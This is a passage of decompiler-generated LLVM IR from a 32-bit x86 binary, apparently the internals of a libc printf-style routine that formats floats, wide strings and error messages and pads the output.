  %v2_805105e = load x86_fp80, x86_fp80* %v1_805105e, align 4
  br label %dec_label_pc_8051064

dec_label_pc_8051062:                             ; preds = %dec_label_pc_8051050
  %v1_8051062 = inttoptr i32 %v3_8051055 to double*
  %v2_8051062 = load double, double* %v1_8051062, align 4
  %v3_8051062 = fpext double %v2_8051062 to x86_fp80
  br label %dec_label_pc_8051064

dec_label_pc_8051064:                             ; preds = %dec_label_pc_805105e, %dec_label_pc_8051062
  %storemerge4 = phi x86_fp80 [ %v2_805105e, %dec_label_pc_805105e ], [ %v3_8051062, %dec_label_pc_8051062 ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_8051064 = load i32, i32* @esi, align 4
  %v2_8051064 = add i32 %v0_8050eb0.lcssa, -4
  %v3_8051064 = inttoptr i32 %v2_8051064 to i32*
  store i32 %v0_8051064, i32* %v3_8051064, align 4
  %v0_8051065 = load i32, i32* @esi, align 4
  %v2_8051065 = add i32 %v0_8050eb0.lcssa, -8
  %v3_8051065 = inttoptr i32 %v2_8051065 to i32*
  store i32 %v0_8051065, i32* %v3_8051065, align 4
  %v1_8051066 = add i32 %v0_8050eb0.lcssa, -12
  %v2_8051066 = inttoptr i32 %v1_8051066 to i32*
  store i32 134548774, i32* %v2_8051066, align 4
  %v1_805106b = add i32 %v0_8050eb0.lcssa, 20
  store i32 %v1_805106b, i32* %eax.global-to-local, align 4
  %v2_805106f = add i32 %v0_8050eb0.lcssa, -16
  %v3_805106f = inttoptr i32 %v2_805106f to i32*
  store i32 %v1_805106b, i32* %v3_805106f, align 4
  %v1_8051070 = add i32 %v0_8050eb0.lcssa, -28
  %v10_8051070 = icmp slt i32 %v1_8051070, 0
  store i1 %v10_8051070, i1* %sf.global-to-local, align 1
  %v1_8051073 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8051073 = inttoptr i32 %v1_8051070 to x86_fp80*
  store x86_fp80 %v1_8051073, x86_fp80* %v3_8051073, align 4
  %v1_8051076 = add i32 %v0_8050eb0.lcssa, 368
  %v2_8051076 = inttoptr i32 %v1_8051076 to i32*
  %v3_8051076 = load i32, i32* %v2_8051076, align 4
  %v5_8051076 = add i32 %v0_8050eb0.lcssa, -32
  %v6_8051076 = inttoptr i32 %v5_8051076 to i32*
  store i32 %v3_8051076, i32* %v6_8051076, align 4
  %v0_805107d = call i32 @_fpmaxtostr()
  store i32 %v0_805107d, i32* %eax.global-to-local, align 4
  %v0_8051082 = load i32, i32* @esp, align 4
  %v1_8051082 = add i32 %v0_8051082, 32
  %v2_8051085 = icmp slt i32 %v0_805107d, 0
  store i1 %v2_8051085, i1* %sf.global-to-local, align 1
  br i1 %v2_8051085, label %dec_label_pc_8051333, label %dec_label_pc_805108d

dec_label_pc_805108d:                             ; preds = %dec_label_pc_8051064
  %v1_805108d = inttoptr i32 %v1_8051082 to i32*
  %v2_805108d = load i32, i32* %v1_805108d, align 4
  %v4_805108d = add i32 %v2_805108d, %v0_805107d
  %v15_805108d = icmp slt i32 %v4_805108d, 0
  store i1 %v15_805108d, i1* %sf.global-to-local, align 1
  store i32 %v4_805108d, i32* %v1_805108d, align 4
  %v0_8051320.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051320

dec_label_pc_8051095:                             ; preds = %dec_label_pc_805104b
  %v1_8051095 = add i32 %v3_8050eb0, -17
  %v5_8051095 = icmp ult i32 %v3_8050eb0, 17
  %v9_8051095 = icmp eq i32 %v1_8051095, 0
  %v10_8051095 = icmp slt i32 %v1_8051095, 0
  store i1 %v10_8051095, i1* %sf.global-to-local, align 1
  %v2_8051098 = or i1 %v5_8051095, %v9_8051095
  br i1 %v2_8051098, label %dec_label_pc_805109e, label %dec_label_pc_8051132

dec_label_pc_805109e:                             ; preds = %dec_label_pc_8051095
  %v1_805109e = add i32 %v0_8050eb0.lcssa, 332
  %v2_805109e = inttoptr i32 %v1_805109e to i32*
  store i32 0, i32* %v2_805109e, align 4
  %v0_80510a9 = load i32, i32* @esp, align 4
  %v1_80510a9 = add i32 %v0_80510a9, 344
  %v2_80510a9 = inttoptr i32 %v1_80510a9 to i32*
  %v3_80510a9 = load i32, i32* %v2_80510a9, align 4
  store i32 %v3_80510a9, i32* %edx.global-to-local, align 4
  %v1_80510b0 = icmp eq i1 %v9_8051095, false
  br i1 %v1_80510b0, label %dec_label_pc_8051102, label %dec_label_pc_80510b2

dec_label_pc_80510b2:                             ; preds = %dec_label_pc_805109e
  %v1_80510b2 = inttoptr i32 %v3_80510a9 to i32*
  %v2_80510b2 = load i32, i32* %v1_80510b2, align 4
  store i32 %v2_80510b2, i32* %eax.global-to-local, align 4
  %v1_80510b4 = icmp eq i32 %v2_80510b2, 0
  %v2_80510b4 = icmp slt i32 %v2_80510b2, 0
  store i1 %v2_80510b4, i1* %sf.global-to-local, align 1
  %v2_80510b6 = add i32 %v0_80510a9, 340
  %v3_80510b6 = inttoptr i32 %v2_80510b6 to i32*
  store i32 %v2_80510b2, i32* %v3_80510b6, align 4
  br i1 %v1_80510b4, label %dec_label_pc_80511bd, label %dec_label_pc_80510c3

dec_label_pc_80510c3:                             ; preds = %dec_label_pc_80510b2
  %v0_80510c3 = load i32, i32* @esp, align 4
  %v1_80510c3 = add i32 %v0_80510c3, 20
  %v2_80510c3 = inttoptr i32 %v1_80510c3 to i32*
  %v3_80510c3 = load i32, i32* %v2_80510c3, align 4
  %v1_80510ca = add i32 %v0_80510c3, 340
  store i32 %v1_80510ca, i32* %ecx.global-to-local, align 4
  %v2_80510d1 = icmp slt i32 %v3_80510c3, 0
  store i1 %v2_80510d1, i1* %sf.global-to-local, align 1
  %v1_80510d3 = icmp eq i1 %v2_80510d1, false
  %v4_80510d3 = select i1 %v1_80510d3, i32 %v3_80510c3, i32 -1
  store i32 %v4_80510d3, i32* %edx.global-to-local, align 4
  %v1_80510d6 = add i32 %v0_80510c3, 332
  store i32 %v1_80510d6, i32* %eax.global-to-local, align 4
  %v2_80510dd = add i32 %v0_80510c3, -4
  %v3_80510dd = inttoptr i32 %v2_80510dd to i32*
  store i32 %v1_80510d6, i32* %v3_80510dd, align 4
  %v0_80510de = load i32, i32* %edx.global-to-local, align 4
  %v2_80510de = add i32 %v0_80510c3, -8
  %v3_80510de = inttoptr i32 %v2_80510de to i32*
  store i32 %v0_80510de, i32* %v3_80510de, align 4
  %v0_80510df = load i32, i32* %ecx.global-to-local, align 4
  %v2_80510df = add i32 %v0_80510c3, -12
  %v3_80510df = inttoptr i32 %v2_80510df to i32*
  store i32 %v0_80510df, i32* %v3_80510df, align 4
  %v0_80510e0 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80510e0 = add i32 %v0_80510c3, -16
  %v3_80510e0 = inttoptr i32 %v2_80510e0 to i32*
  store i32 %v0_80510e0, i32* %v3_80510e0, align 4
  %v0_80510e1 = call i32 @__GI_wcsrtombs()
  store i32 %v0_80510e1, i32* %eax.global-to-local, align 4
  %v0_80510e6 = load i32, i32* @esp, align 4
  %v1_80510e6 = add i32 %v0_80510e6, 16
  %v1_80510e9 = add i32 %v0_80510e1, 1
  %v10_80510e9 = icmp eq i32 %v1_80510e9, 0
  %v11_80510e9 = icmp slt i32 %v1_80510e9, 0
  store i1 %v11_80510e9, i1* %sf.global-to-local, align 1
  store i32 %v0_80510e1, i32* @esi, align 4
  br i1 %v10_80510e9, label %dec_label_pc_8051333, label %dec_label_pc_80510f4

dec_label_pc_80510f4:                             ; preds = %dec_label_pc_80510c3
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_80511ce

dec_label_pc_8051102:                             ; preds = %dec_label_pc_805109e
  %v0_8051102 = load i32, i32* @ebx, align 4
  %v2_8051102 = add i32 %v0_80510a9, -4
  %v3_8051102 = inttoptr i32 %v2_8051102 to i32*
  store i32 %v0_8051102, i32* %v3_8051102, align 4
  %v1_8051103 = add i32 %v0_80510a9, 332
  store i32 %v1_8051103, i32* %eax.global-to-local, align 4
  %v2_805110a = add i32 %v0_80510a9, -8
  %v3_805110a = inttoptr i32 %v2_805110a to i32*
  store i32 %v1_8051103, i32* %v3_805110a, align 4
  %v0_805110b = load i32, i32* %edx.global-to-local, align 4
  %v1_805110b = inttoptr i32 %v0_805110b to i32*
  %v2_805110b = load i32, i32* %v1_805110b, align 4
  %v4_805110b = add i32 %v0_80510a9, -12
  %v5_805110b = inttoptr i32 %v4_805110b to i32*
  store i32 %v2_805110b, i32* %v5_805110b, align 4
  %v1_805110d = add i32 %v0_80510a9, 204
  store i32 %v1_805110d, i32* @edi, align 4
  %v2_8051114 = add i32 %v0_80510a9, -16
  %v3_8051114 = inttoptr i32 %v2_8051114 to i32*
  store i32 %v1_805110d, i32* %v3_8051114, align 4
  %v0_8051115 = call i32 @__GI_wcrtomb()
  store i32 %v0_8051115, i32* %eax.global-to-local, align 4
  %v0_805111a = load i32, i32* @esp, align 4
  %v1_805111a = add i32 %v0_805111a, 16
  %v1_805111d = add i32 %v0_8051115, 1
  %v10_805111d = icmp eq i32 %v1_805111d, 0
  %v11_805111d = icmp slt i32 %v1_805111d, 0
  store i1 %v11_805111d, i1* %sf.global-to-local, align 1
  store i32 %v0_8051115, i32* @esi, align 4
  br i1 %v10_805111d, label %dec_label_pc_8051333, label %dec_label_pc_8051128

dec_label_pc_8051128:                             ; preds = %dec_label_pc_8051102
  %v2_8051128 = add i32 %v0_8051115, 220
  %v3_8051128 = add i32 %v2_8051128, %v0_805111a
  %v4_8051128 = inttoptr i32 %v3_8051128 to i8*
  store i8 0, i8* %v4_8051128, align 1
  br label %dec_label_pc_8051160

dec_label_pc_8051132:                             ; preds = %dec_label_pc_8051095
  %v1_8051132 = add i32 %v3_8050eb0, -19
  %v5_8051132 = icmp ult i32 %v3_8050eb0, 19
  %v9_8051132 = icmp eq i32 %v1_8051132, 0
  %v10_8051132 = icmp slt i32 %v1_8051132, 0
  store i1 %v10_8051132, i1* %sf.global-to-local, align 1
  %v2_8051135 = or i1 %v5_8051132, %v9_8051132
  br i1 %v2_8051135, label %dec_label_pc_8051137, label %dec_label_pc_805118f

dec_label_pc_8051137:                             ; preds = %dec_label_pc_8051132
  %v1_8051137 = add i32 %v0_8050eb0.lcssa, 344
  %v2_8051137 = inttoptr i32 %v1_8051137 to i32*
  %v3_8051137 = load i32, i32* %v2_8051137, align 4
  store i32 %v3_8051137, i32* %edx.global-to-local, align 4
  %v1_805113e = icmp eq i1 %v9_8051132, false
  %v1_8051169 = inttoptr i32 %v3_8051137 to i32*
  %v2_8051169 = load i32, i32* %v1_8051169, align 4
  br i1 %v1_805113e, label %dec_label_pc_8051169, label %dec_label_pc_8051140

dec_label_pc_8051140:                             ; preds = %dec_label_pc_8051137
  store i32 %v2_8051169, i32* @edi, align 4
  %v1_8051142 = icmp eq i32 %v2_8051169, 0
  %v2_8051142 = icmp slt i32 %v2_8051169, 0
  store i1 %v2_8051142, i1* %sf.global-to-local, align 1
  br i1 %v1_8051142, label %dec_label_pc_80511bd, label %dec_label_pc_8051146

dec_label_pc_8051146:                             ; preds = %dec_label_pc_8051140, %dec_label_pc_8051198
  %v1_805114d = phi i32 [ %v0_8050eb0.lcssa, %dec_label_pc_8051140 ], [ %v1_80511b2, %dec_label_pc_8051198 ]
  %v1_8051146 = add i32 %v1_805114d, 20
  %v2_8051146 = inttoptr i32 %v1_8051146 to i32*
  %v3_8051146 = load i32, i32* %v2_8051146, align 4
  store i32 %v3_8051146, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_805114d = add i32 %v1_805114d, -4
  %v3_805114d = inttoptr i32 %v2_805114d to i32*
  store i32 %v3_8050eb0, i32* %v3_805114d, align 4
  %v2_805114e = add i32 %v1_805114d, -8
  %v3_805114e = inttoptr i32 %v2_805114e to i32*
  store i32 %v3_8050eb0, i32* %v3_805114e, align 4
  %v2_805114f = icmp slt i32 %v3_8051146, 0
  store i1 %v2_805114f, i1* %sf.global-to-local, align 1
  %v1_8051151 = icmp eq i1 %v2_805114f, false
  %v2_8051151 = load i32, i32* %eax.global-to-local, align 4
  %v4_8051151 = select i1 %v1_8051151, i32 %v3_8051146, i32 %v2_8051151
  store i32 %v4_8051151, i32* %eax.global-to-local, align 4
  %v2_8051154 = add i32 %v1_805114d, -12
  %v3_8051154 = inttoptr i32 %v2_8051154 to i32*
  store i32 %v4_8051151, i32* %v3_8051154, align 4
  %v0_8051155 = load i32, i32* @edi, align 4
  %v2_8051155 = add i32 %v1_805114d, -16
  %v3_8051155 = inttoptr i32 %v2_8051155 to i32*
  store i32 %v0_8051155, i32* %v3_8051155, align 4
  %v0_8051156 = call i32 @strnlen()
  store i32 %v0_8051156, i32* %eax.global-to-local, align 4
  %v0_805115b = load i32, i32* @esp, align 4
  %v1_805115b = add i32 %v0_805115b, 16
  %v7_805115b = icmp slt i32 %v1_805115b, 0
  store i1 %v7_805115b, i1* %sf.global-to-local, align 1
  store i32 %v0_8051156, i32* @esi, align 4
  br label %dec_label_pc_8051160

dec_label_pc_8051160:                             ; preds = %dec_label_pc_8051128, %dec_label_pc_8051146
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_80511ce

dec_label_pc_8051169:                             ; preds = %dec_label_pc_8051137
  store i32 %v2_8051169, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_8051177 = add i32 %v0_8050eb0.lcssa, 204
  store i32 %v1_8051177, i32* @edi, align 4
  %v1_805117e = add i32 %v0_8050eb0.lcssa, 205
  %v2_805117e = inttoptr i32 %v1_805117e to i8*
  store i8 0, i8* %v2_805117e, align 1
  %v0_8051186 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051186 = trunc i32 %v0_8051186 to i8
  %v2_8051186 = load i32, i32* @esp, align 4
  %v3_8051186 = add i32 %v2_8051186, 204
  %v4_8051186 = inttoptr i32 %v3_8051186 to i8*
  store i8 %v1_8051186, i8* %v4_8051186, align 1
  br label %dec_label_pc_80511ce

dec_label_pc_805118f:                             ; preds = %dec_label_pc_8051132
  %v1_805118f = add i32 %v3_8050eb0, -20
  %v9_805118f = icmp eq i32 %v1_805118f, 0
  %v10_805118f = icmp slt i32 %v1_805118f, 0
  store i1 %v10_805118f, i1* %sf.global-to-local, align 1
  %v1_8051192 = icmp eq i1 %v9_805118f, false
  br i1 %v1_8051192, label %dec_label_pc_8051333, label %dec_label_pc_8051198

dec_label_pc_8051198:                             ; preds = %dec_label_pc_805118f
  %v0_8051198 = load i32, i32* %stack_var_-364, align 4
  %v1_8051198 = call i32 @__errno_location(i32 %v0_8051198)
  store i32 %v1_8051198, i32* %eax.global-to-local, align 4
  %v0_805119d = load i32, i32* @edx, align 4
  %v1_805119d = load i32, i32* @esp, align 4
  %v2_805119d = add i32 %v1_805119d, -4
  %v3_805119d = inttoptr i32 %v2_805119d to i32*
  store i32 %v0_805119d, i32* %v3_805119d, align 4
  %v1_805119e = add i32 %v1_805119d, -8
  %v2_805119e = inttoptr i32 %v1_805119e to i32*
  store i32 128, i32* %v2_805119e, align 4
  %v1_80511a3 = add i32 %v1_805119d, 204
  store i32 %v1_80511a3, i32* %edx.global-to-local, align 4
  %v2_80511aa = add i32 %v1_805119d, -12
  %v3_80511aa = inttoptr i32 %v2_80511aa to i32*
  store i32 %v1_80511a3, i32* %v3_80511aa, align 4
  %v1_80511ab = inttoptr i32 %v1_8051198 to i32*
  %v2_80511ab = load i32, i32* %v1_80511ab, align 4
  %v4_80511ab = add i32 %v1_805119d, -16
  %v5_80511ab = inttoptr i32 %v4_80511ab to i32*
  store i32 %v2_80511ab, i32* %v5_80511ab, align 4
  %v0_80511ad = load i32, i32* %stack_var_-364, align 4
  %v3_80511ad = call i32 @__GI___glibc_strerror_r(i32 %v0_80511ad, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80511ad, i32* %eax.global-to-local, align 4
  %v0_80511b2 = load i32, i32* @esp, align 4
  %v1_80511b2 = add i32 %v0_80511b2, 16
  %v7_80511b2 = icmp slt i32 %v1_80511b2, 0
  store i1 %v7_80511b2, i1* %sf.global-to-local, align 1
  store i32 %v3_80511ad, i32* @edi, align 4
  br label %dec_label_pc_8051146

dec_label_pc_80511b9:                             ; preds = %dec_label_pc_805103a, %dec_label_pc_8051033, %dec_label_pc_8051020
  %v0_80511d634 = phi i32 [ %v1_8050fc9, %dec_label_pc_805103a ], [ 0, %dec_label_pc_8051033 ], [ 5, %dec_label_pc_8051020 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80511d3

dec_label_pc_80511bd:                             ; preds = %dec_label_pc_8051140, %dec_label_pc_80510b2
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805b8ca.214 to i32), i32* @edi, align 4
  br label %dec_label_pc_80511ce

dec_label_pc_80511ce:                             ; preds = %dec_label_pc_8051169, %dec_label_pc_8051160, %dec_label_pc_80510f4, %dec_label_pc_80511bd
  %v0_80511ce = load i32, i32* @esp, align 4
  %v1_80511ce = add i32 %v0_80511ce, 7
  %v2_80511ce = inttoptr i32 %v1_80511ce to i8*
  store i8 32, i8* %v2_80511ce, align 1
  %v0_80511d6.pre = load i32, i32* @esi, align 4
  %v1_80511d6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80511d3

dec_label_pc_80511d3:                             ; preds = %dec_label_pc_80511b9, %dec_label_pc_8051042, %dec_label_pc_80511ce
  %v1_80511d6 = phi i32 [ 0, %dec_label_pc_80511b9 ], [ %v2_805103a, %dec_label_pc_8051042 ], [ %v1_80511d6.pre, %dec_label_pc_80511ce ]
  %v0_80511d6 = phi i32 [ %v0_80511d634, %dec_label_pc_80511b9 ], [ %v1_8050fc9, %dec_label_pc_8051042 ], [ %v0_80511d6.pre, %dec_label_pc_80511ce ]
  %v0_80511d3 = load i32, i32* @ebp, align 4
  %v1_80511d3 = add i32 %v0_80511d3, -11
  %v9_80511d3 = icmp eq i32 %v1_80511d3, 0
  %v10_80511d3 = icmp slt i32 %v1_80511d3, 0
  store i1 %v10_80511d3, i1* %sf.global-to-local, align 1
  %v2_80511d6 = add i32 %v0_80511d6, %v1_80511d6
  store i32 %v2_80511d6, i32* @edx, align 4
  br i1 %v9_80511d3, label %dec_label_pc_80511e7, label %dec_label_pc_80511db

dec_label_pc_80511db:                             ; preds = %dec_label_pc_80511d3
  %v1_80511dd = add i32 %v0_80511d3, -5
  %v6_80511dd = sub i32 4, %v0_80511d3
  %v7_80511dd = and i32 %v6_80511dd, %v0_80511d3
  %v8_80511dd = icmp slt i32 %v7_80511dd, 0
  %v9_80511dd = icmp eq i32 %v1_80511dd, 0
  %v10_80511dd = icmp slt i32 %v1_80511dd, 0
  store i1 %v10_80511dd, i1* %sf.global-to-local, align 1
  %v3_80511e0 = icmp eq i1 %v10_80511dd, %v8_80511dd
  %v4_80511e0 = icmp eq i1 %v9_80511dd, false
  %v5_80511e0 = and i1 %v4_80511e0, %v3_80511e0
  %v6_80511e0 = zext i1 %v5_80511e0 to i32
  store i32 %v6_80511e0, i32* %eax.global-to-local, align 4
  %v2_80511e3 = add i32 %v2_80511d6, 1
  %v3_80511e3 = add i32 %v2_80511e3, %v6_80511e0
  store i32 %v3_80511e3, i32* @edx, align 4
  br label %dec_label_pc_80511e7

dec_label_pc_80511e7:                             ; preds = %dec_label_pc_80511d3, %dec_label_pc_80511db
  %v0_80511e7 = load i32, i32* @esp, align 4
  %v1_80511e7 = add i32 %v0_80511e7, 24
  %v2_80511e7 = inttoptr i32 %v1_80511e7 to i32*
  %v3_80511e7 = load i32, i32* %v2_80511e7, align 4
  store i32 %v3_80511e7, i32* %eax.global-to-local, align 4
  %v1_80511eb = add i32 %v0_80511e7, 8
  %v2_80511eb = inttoptr i32 %v1_80511eb to i32*
  store i32 0, i32* %v2_80511eb, align 4
  %v0_80511f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80511f3 = load i32, i32* @edx, align 4
  %v2_80511f3 = sub i32 %v0_80511f3, %v1_80511f3
  %v7_80511f3 = icmp ult i32 %v0_80511f3, %v1_80511f3
  %v12_80511f3 = icmp eq i32 %v2_80511f3, 0
  %v13_80511f3 = icmp slt i32 %v2_80511f3, 0
  store i1 %v13_80511f3, i1* %sf.global-to-local, align 1
  %v2_80511f5 = or i1 %v7_80511f3, %v12_80511f3
  br i1 %v2_80511f5, label %dec_label_pc_80511fd, label %dec_label_pc_80511f7

dec_label_pc_80511f7:                             ; preds = %dec_label_pc_80511e7
  store i1 %v13_80511f3, i1* %sf.global-to-local, align 1
  store i32 %v2_80511f3, i32* %eax.global-to-local, align 4
  %v1_80511f9 = load i32, i32* @esp, align 4
  %v2_80511f9 = add i32 %v1_80511f9, 8
  %v3_80511f9 = inttoptr i32 %v2_80511f9 to i32*
  store i32 %v2_80511f3, i32* %v3_80511f9, align 4
  %v0_8051201.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80511fd

dec_label_pc_80511fd:                             ; preds = %dec_label_pc_80511e7, %dec_label_pc_80511f7
  %v0_8051201 = phi i32 [ %v1_80511f3, %dec_label_pc_80511e7 ], [ %v0_8051201.pre, %dec_label_pc_80511f7 ]
  %v0_80511fd = load i32, i32* @esp, align 4
  %v1_80511fd = add i32 %v0_80511fd, 8
  %v2_80511fd = inttoptr i32 %v1_80511fd to i32*
  %v3_80511fd = load i32, i32* %v2_80511fd, align 4
  store i32 %v3_80511fd, i32* @ecx, align 4
  %v2_8051201 = add i32 %v3_80511fd, %v0_8051201
  store i32 %v2_8051201, i32* %eax.global-to-local, align 4
  %v1_8051204 = inttoptr i32 %v0_80511fd to i32*
  %v2_8051204 = load i32, i32* %v1_8051204, align 4
  %v4_8051204 = add i32 %v2_8051204, %v2_8051201
  %v15_8051204 = icmp slt i32 %v4_8051204, 0
  store i1 %v15_8051204, i1* %sf.global-to-local, align 1
  store i32 %v4_8051204, i32* %v1_8051204, align 4
  %v0_8051207 = load i32, i32* @esp, align 4
  %v1_8051207 = add i32 %v0_8051207, 7
  %v2_8051207 = inttoptr i32 %v1_8051207 to i8*
  %v3_8051207 = load i8, i8* %v2_8051207, align 1
  %v4_8051207 = add i8 %v3_8051207, -48
  %v9_8051207 = icmp eq i8 %v4_8051207, 0
  %v10_8051207 = icmp slt i8 %v4_8051207, 0
  store i1 %v10_8051207, i1* %sf.global-to-local, align 1
  %v1_805120c = icmp eq i1 %v9_8051207, false
  br i1 %v1_805120c, label %dec_label_pc_8051218, label %dec_label_pc_805120e

dec_label_pc_805120e:                             ; preds = %dec_label_pc_80511fd
  %v0_805120e = load i32, i32* @ebx, align 4
  %v1_805120e = load i32, i32* @ecx, align 4
  %v2_805120e = add i32 %v1_805120e, %v0_805120e
  %v13_805120e = icmp slt i32 %v2_805120e, 0
  store i1 %v13_805120e, i1* %sf.global-to-local, align 1
  store i32 %v2_805120e, i32* @ebx, align 4
  %v1_8051210 = add i32 %v0_8051207, 8
  %v2_8051210 = inttoptr i32 %v1_8051210 to i32*
  store i32 0, i32* %v2_8051210, align 4
  %v0_8051218.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051218

dec_label_pc_8051218:                             ; preds = %dec_label_pc_80511fd, %dec_label_pc_805120e
  %v0_805121f = phi i32 [ %v0_8051207, %dec_label_pc_80511fd ], [ %v0_8051218.pre, %dec_label_pc_805120e ]
  %v1_8051218 = add i32 %v0_805121f, 32
  %v2_8051218 = inttoptr i32 %v1_8051218 to i8*
  %v3_8051218 = load i8, i8* %v2_8051218, align 1
  %v4_8051218 = and i8 %v3_8051218, 8
  %v5_8051218 = icmp eq i8 %v4_8051218, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_805121d = icmp eq i1 %v5_8051218, false
  br i1 %v1_805121d, label %dec_label_pc_8051246, label %dec_label_pc_805121f

dec_label_pc_805121f:                             ; preds = %dec_label_pc_8051218
  %v1_805121f = add i32 %v0_805121f, 8
  %v2_805121f = inttoptr i32 %v1_805121f to i32*
  %v3_805121f = load i32, i32* %v2_805121f, align 4
  store i32 %v3_805121f, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8051228 = add i32 %v0_805121f, 368
  %v2_8051228 = inttoptr i32 %v1_8051228 to i32*
  %v3_8051228 = load i32, i32* %v2_8051228, align 4
  store i32 %v3_8051228, i32* @eax, align 4
  %v0_805122f = call i32 @_charpad()
  store i32 %v0_805122f, i32* %eax.global-to-local, align 4
  %v1_8051234 = load i32, i32* @esp, align 4
  %v2_8051234 = add i32 %v1_8051234, 8
  %v3_8051234 = inttoptr i32 %v2_8051234 to i32*
  %v4_8051234 = load i32, i32* %v3_8051234, align 4
  %v5_8051234 = sub i32 %v0_805122f, %v4_8051234
  %v15_8051234 = icmp eq i32 %v5_8051234, 0
  %v16_8051234 = icmp slt i32 %v5_8051234, 0
  store i1 %v16_8051234, i1* %sf.global-to-local, align 1
  %v1_8051238 = icmp eq i1 %v15_8051234, false
  br i1 %v1_8051238, label %dec_label_pc_8051333, label %dec_label_pc_805123e

dec_label_pc_805123e:                             ; preds = %dec_label_pc_805121f
  store i32 0, i32* %v3_8051234, align 4
  %v1_8051246.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051246

dec_label_pc_8051246:                             ; preds = %dec_label_pc_8051218, %dec_label_pc_805123e
  %v1_8051246 = phi i32 [ %v0_805121f, %dec_label_pc_8051218 ], [ %v1_8051246.pre, %dec_label_pc_805123e ]
  %v0_8051246 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051246 = add i32 %v1_8051246, -4
  %v3_8051246 = inttoptr i32 %v2_8051246 to i32*
  store i32 %v0_8051246, i32* %v3_8051246, align 4
  %v0_8051247 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051247 = add i32 %v1_8051246, -8
  %v3_8051247 = inttoptr i32 %v2_8051247 to i32*
  store i32 %v0_8051247, i32* %v3_8051247, align 4
  %v1_8051248 = add i32 %v1_8051246, 368
  %v2_8051248 = inttoptr i32 %v1_8051248 to i32*
  %v3_8051248 = load i32, i32* %v2_8051248, align 4
  %v5_8051248 = add i32 %v1_8051246, -12
  %v6_8051248 = inttoptr i32 %v5_8051248 to i32*
  store i32 %v3_8051248, i32* %v6_8051248, align 4
  %v0_805124f = load i32, i32* @ebp, align 4
  %v1_805124f = add i32 %v0_805124f, ptrtoint (i32* @global_var_805b8d1.215 to i32)
  store i32 %v1_805124f, i32* %eax.global-to-local, align 4
  %v2_8051255 = add i32 %v1_8051246, -16
  %v3_8051255 = inttoptr i32 %v2_8051255 to i32*
  store i32 %v1_805124f, i32* %v3_8051255, align 4
  %v0_8051256 = load i32, i32* %stack_var_-364, align 4
  %v4_8051256 = inttoptr i32 %v0_8051256 to i8*
  %v5_8051256 = call i32 @__GI_fputs_unlocked(i8* %v4_8051256, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051256, i32* %eax.global-to-local, align 4
  %v0_805125b = load i32, i32* @esp, align 4
  %v1_805125b = add i32 %v0_805125b, 384
  %v2_805125b = inttoptr i32 %v1_805125b to i32*
  %v3_805125b = load i32, i32* %v2_805125b, align 4
  store i32 %v3_805125b, i32* @eax, align 4
  %v0_8051262 = load i32, i32* @ebx, align 4
  store i32 %v0_8051262, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8051269 = call i32 @_charpad()
  store i32 %v0_8051269, i32* %eax.global-to-local, align 4
  %v0_805126e = load i32, i32* @esp, align 4
  %v1_805126e = add i32 %v0_805126e, 16
  %v1_8051271 = load i32, i32* @ebx, align 4
  %v2_8051271 = sub i32 %v0_8051269, %v1_8051271
  %v12_8051271 = icmp eq i32 %v2_8051271, 0
  %v13_8051271 = icmp slt i32 %v2_8051271, 0
  store i1 %v13_8051271, i1* %sf.global-to-local, align 1
  %v1_8051273 = icmp eq i1 %v12_8051271, false
  br i1 %v1_8051273, label %dec_label_pc_8051333, label %dec_label_pc_8051279

dec_label_pc_8051279:                             ; preds = %dec_label_pc_8051246
  %v1_8051279 = add i32 %v0_805126e, 356
  %v2_8051279 = inttoptr i32 %v1_8051279 to i32*
  %v3_8051279 = load i32, i32* %v2_8051279, align 4
  %v4_8051279 = icmp eq i32 %v3_8051279, 0
  %v5_8051279 = icmp slt i32 %v3_8051279, 0
  store i1 %v5_8051279, i1* %sf.global-to-local, align 1
  %v1_8051281 = icmp eq i1 %v4_8051279, false
  br i1 %v1_8051281, label %dec_label_pc_80512a5, label %dec_label_pc_8051283

dec_label_pc_8051283:                             ; preds = %dec_label_pc_8051279
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051285 = load i32, i32* @esi, align 4
  %v1_8051285 = icmp eq i32 %v0_8051285, 0
  %v2_8051285 = icmp slt i32 %v0_8051285, 0
  store i1 %v2_8051285, i1* %sf.global-to-local, align 1
  br i1 %v1_8051285, label %dec_label_pc_805129b, label %dec_label_pc_8051289

dec_label_pc_8051289:                             ; preds = %dec_label_pc_8051283
  %v2_8051289 = add i32 %v0_805126e, 12
  %v3_8051289 = inttoptr i32 %v2_8051289 to i32*
  store i32 0, i32* %v3_8051289, align 4
  %v1_805128a = add i32 %v0_805126e, 384
